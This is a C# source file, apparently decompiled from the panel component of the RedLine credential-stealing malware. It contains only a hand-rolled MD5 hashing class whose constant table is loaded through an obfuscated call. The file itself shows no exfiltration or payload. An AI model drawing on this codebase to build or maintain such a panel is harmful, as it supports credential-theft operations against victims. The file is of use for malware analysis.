using System;
using System.Runtime.CompilerServices;
using System.Threading;

namespace RedLine.MainPanel.Data.Helpers;

public class MD5
{
	public delegate void ValueChanging(object sender, MD5ChangingEventArgs e);

	public delegate void ValueChanged(object sender, MD5ChangedEventArgs e);

	protected static readonly uint[] T = global::_003CModule_003E.smethod_5<uint[]>(-94844814);

	protected uint[] X = new uint[16];

	protected Digest dgFingerPrint;

	protected byte[] m_byteInput;

	[CompilerGenerated]
	private object object_0;

	[CompilerGenerated]
	private object object_1;

	public string Value
	{
		get
		{
			char[] array = new char[m_byteInput.Length];
			for (int i = 0; i < m_byteInput.Length; i++)
			{
				array[i] = (char)m_byteInput[i];
			}
			return new string(array);
		}
		set
		{
			if (object_0 != null)
			{
				object_0(this, new MD5ChangingEventArgs(value));
			}
			m_byteInput = new byte[value.Length];
			for (int i = 0; i < value.Length; i++)
			{
				m_byteInput[i] = (byte)value[i];
			}
			dgFingerPrint = CalculateMD5Value();
			if (object_1 != null)
			{
				object_1(this, new MD5ChangedEventArgs(value, dgFingerPrint.ToString()));
			}
		}
	}

	public byte[] ValueAsByte
	{
		get
		{
			byte[] array = new byte[m_byteInput.Length];
			for (int i = 0; i < m_byteInput.Length; i++)
			{
				array[i] = m_byteInput[i];
			}
			return array;
		}
		set
		{
			if (object_0 != null)
			{
				object_0(this, new MD5ChangingEventArgs(value));
			}
			m_byteInput = new byte[value.Length];
			for (int i = 0; i < value.Length; i++)
			{
				m_byteInput[i] = value[i];
			}
			dgFingerPrint = CalculateMD5Value();
			if (object_1 != null)
			{
				object_1(this, new MD5ChangedEventArgs(value, dgFingerPrint.ToString()));
			}
		}
	}

	public string FingerPrint => dgFingerPrint.ToString();

	public event ValueChanging OnValueChanging
	{
		[CompilerGenerated]
		add
		{
			ValueChanging valueChanging = (ValueChanging)object_0;
			ValueChanging valueChanging2;
			do
			{
				valueChanging2 = valueChanging;
				ValueChanging value2 = (ValueChanging)Delegate.Combine(valueChanging2, value);
				valueChanging = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, ValueChanging>(ref object_0), value2, valueChanging2);
			}
			while ((object)valueChanging != valueChanging2);
		}
		[CompilerGenerated]
		remove
		{
			ValueChanging valueChanging = (ValueChanging)object_0;
			ValueChanging valueChanging2;
			do
			{
				valueChanging2 = valueChanging;
				ValueChanging value2 = (ValueChanging)Delegate.Remove(valueChanging2, value);
				valueChanging = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, ValueChanging>(ref object_0), value2, valueChanging2);
			}
			while ((object)valueChanging != valueChanging2);
		}
	}

	public event ValueChanged OnValueChanged
	{
		[CompilerGenerated]
		add
		{
			ValueChanged valueChanged = (ValueChanged)object_1;
			ValueChanged valueChanged2;
			do
			{
				valueChanged2 = valueChanged;
				ValueChanged value2 = (ValueChanged)Delegate.Combine(valueChanged2, value);
				valueChanged = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, ValueChanged>(ref object_1), value2, valueChanged2);
			}
			while ((object)valueChanged != valueChanged2);
		}
		[CompilerGenerated]
		remove
		{
			ValueChanged valueChanged = (ValueChanged)object_1;
			ValueChanged valueChanged2;
			do
			{
				valueChanged2 = valueChanged;
				ValueChanged value2 = (ValueChanged)Delegate.Remove(valueChanged2, value);
				valueChanged = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, ValueChanged>(ref object_1), value2, valueChanged2);
			}
			while ((object)valueChanged != valueChanged2);
		}
	}

	public MD5()
	{
		Value = "";
	}

	protected Digest CalculateMD5Value()
	{
		Digest digest = new Digest();
		byte[] array = CreatePaddedBuffer();
		uint num = (uint)(array.Length * 8) / 32u;
		for (uint num2 = 0u; num2 < num / 16; num2++)
		{
			CopyBlock(array, num2);
			PerformTransformation(ref digest.A, ref digest.B, ref digest.C, ref digest.D);
		}
		return digest;
	}

	protected void TransF(ref uint a, uint b, uint c, uint d, uint k, ushort s, uint i)
	{
		a = b + MD5Helper.RotateLeft(a + ((b & c) | (~b & d)) + X[k] + T[i - 1], s);
	}

	protected void TransG(ref uint a, uint b, uint c, uint d, uint k, ushort s, uint i)
	{
		a = b + MD5Helper.RotateLeft(a + ((b & d) | (c & ~d)) + X[k] + T[i - 1], s);
	}

	protected void TransH(ref uint a, uint b, uint c, uint d, uint k, ushort s, uint i)
	{
		a = b + MD5Helper.RotateLeft(a + (b ^ c ^ d) + X[k] + T[i - 1], s);
	}

	protected void TransI(ref uint a, uint b, uint c, uint d, uint k, ushort s, uint i)
	{
		a = b + MD5Helper.RotateLeft(a + (c ^ (b | ~d)) + X[k] + T[i - 1], s);
	}

	protected void PerformTransformation(ref uint A, ref uint B, ref uint C, ref uint D)
	{
		uint num = A;
		uint num2 = B;
		uint num3 = C;
		uint num4 = D;
		TransF(ref A, B, C, D, 0u, 7, 1u);
		TransF(ref D, A, B, C, 1u, 12, 2u);
		TransF(ref C, D, A, B, 2u, 17, 3u);
		TransF(ref B, C, D, A, 3u, 22, 4u);
		TransF(ref A, B, C, D, 4u, 7, 5u);
		TransF(ref D, A, B, C, 5u, 12, 6u);
		TransF(ref C, D, A, B, 6u, 17, 7u);
		TransF(ref B, C, D, A, 7u, 22, 8u);
		TransF(ref A, B, C, D, 8u, 7, 9u);
		TransF(ref D, A, B, C, 9u, 12, 10u);
		TransF(ref C, D, A, B, 10u, 17, 11u);
		TransF(ref B, C, D, A, 11u, 22, 12u);
		TransF(ref A, B, C, D, 12u, 7, 13u);
		TransF(ref D, A, B, C, 13u, 12, 14u);
		TransF(ref C, D, A, B, 14u, 17, 15u);
		TransF(ref B, C, D, A, 15u, 22, 16u);
		TransG(ref A, B, C, D, 1u, 5, 17u);
		TransG(ref D, A, B, C, 6u, 9, 18u);
		TransG(ref C, D, A, B, 11u, 14, 19u);
		TransG(ref B, C, D, A, 0u, 20, 20u);
		TransG(ref A, B, C, D, 5u, 5, 21u);
		TransG(ref D, A, B, C, 10u, 9, 22u);
		TransG(ref C, D, A, B, 15u, 14, 23u);
		TransG(ref B, C, D, A, 4u, 20, 24u);
		TransG(ref A, B, C, D, 9u, 5, 25u);
		TransG(ref D, A, B, C, 14u, 9, 26u);
		TransG(ref C, D, A, B, 3u, 14, 27u);
		TransG(ref B, C, D, A, 8u, 20, 28u);
		TransG(ref A, B, C, D, 13u, 5, 29u);
		TransG(ref D, A, B, C, 2u, 9, 30u);
		TransG(ref C, D, A, B, 7u, 14, 31u);
		TransG(ref B, C, D, A, 12u, 20, 32u);
		TransH(ref A, B, C, D, 5u, 4, 33u);
		TransH(ref D, A, B, C, 8u, 11, 34u);
		TransH(ref C, D, A, B, 11u, 16, 35u);
		TransH(ref B, C, D, A, 14u, 23, 36u);
		TransH(ref A, B, C, D, 1u, 4, 37u);
		TransH(ref D, A, B, C, 4u, 11, 38u);
		TransH(ref C, D, A, B, 7u, 16, 39u);
		TransH(ref B, C, D, A, 10u, 23, 40u);
		TransH(ref A, B, C, D, 13u, 4, 41u);
		TransH(ref D, A, B, C, 0u, 11, 42u);
		TransH(ref C, D, A, B, 3u, 16, 43u);
		TransH(ref B, C, D, A, 6u, 23, 44u);
		TransH(ref A, B, C, D, 9u, 4, 45u);
		TransH(ref D, A, B, C, 12u, 11, 46u);
		TransH(ref C, D, A, B, 15u, 16, 47u);
		TransH(ref B, C, D, A, 2u, 23, 48u);
		TransI(ref A, B, C, D, 0u, 6, 49u);
		TransI(ref D, A, B, C, 7u, 10, 50u);
		TransI(ref C, D, A, B, 14u, 15, 51u);
		TransI(ref B, C, D, A, 5u, 21, 52u);
		TransI(ref A, B, C, D, 12u, 6, 53u);
		TransI(ref D, A, B, C, 3u, 10, 54u);
		TransI(ref C, D, A, B, 10u, 15, 55u);
		TransI(ref B, C, D, A, 1u, 21, 56u);
		TransI(ref A, B, C, D, 8u, 6, 57u);
		TransI(ref D, A, B, C, 15u, 10, 58u);
		TransI(ref C, D, A, B, 6u, 15, 59u);
		TransI(ref B, C, D, A, 13u, 21, 60u);
		TransI(ref A, B, C, D, 4u, 6, 61u);
		TransI(ref D, A, B, C, 11u, 10, 62u);
		TransI(ref C, D, A, B, 2u, 15, 63u);
		TransI(ref B, C, D, A, 9u, 21, 64u);
		A += num;
		B += num2;
		C += num3;
		D += num4;
	}

	protected byte[] CreatePaddedBuffer()
	{
		uint num = (uint)((448 - m_byteInput.Length * 8 % 512 + 512) % 512);
		if (num == 0)
		{
			num = 512u;
		}
		uint num2 = (uint)(m_byteInput.Length + num / 8 + 8L);
		ulong num3 = (ulong)(m_byteInput.Length * 8L);
		byte[] array = new byte[num2];
		for (int i = 0; i < m_byteInput.Length; i++)
		{
			array[i] = m_byteInput[i];
		}
		array[m_byteInput.Length] |= 128;
		for (int num4 = 8; num4 > 0; num4--)
		{
			array[num2 - num4] = (byte)((num3 >> (8 - num4) * 8) & 0xFFuL);
		}
		return array;
	}

	protected void CopyBlock(byte[] bMsg, uint block)
	{
		block <<= 6;
		for (uint num = 0u; num < 61; num += 4)
		{
			X[num >> 2] = (uint)((bMsg[block + (num + 3)] << 24) | (bMsg[block + (num + 2)] << 16) | (bMsg[block + (num + 1)] << 8) | bMsg[block + num]);
		}
	}
}
